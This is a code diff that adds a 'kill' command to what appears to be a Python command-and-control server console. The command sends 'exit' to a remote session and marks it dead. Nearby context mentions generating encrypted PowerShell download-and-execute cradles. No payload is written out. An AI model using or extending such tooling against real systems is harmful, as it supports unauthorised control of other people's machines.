@@ -340,6 +340,22 @@ if __name__ == '__main__':
                     except IndexError:
                         print(f'[-] Session {num} does not exist.')
 
+            # Command to kill a session
+            if command.split(' ')[0] == 'kill':
+                try:
+                    num = int(command.split(' ')[1])
+                    session_id = (sessions[num - 1])[0]
+                    if num < 1:
+                        print(f'[-] Session {num} doesn\'t exits.')
+                    elif sessions[num - 1][6] == 'Active':
+                        outbound_message(session_id, 'exit')
+                        sessions[num - 1][6] = 'Dead'
+                        print(f'[!] Session {num} terminated.')
+                    else:
+                        print(f'[-] Session {num} already dead.')
+                except (IndexError, ValueError):
+                    print(f'[-] Session {num} doesn\'t exits.')
+
             # Command to generate powershell encrypted commands - used for download and execute cradles
             if command == 'pwsh enc':
                 pwsh_enc()
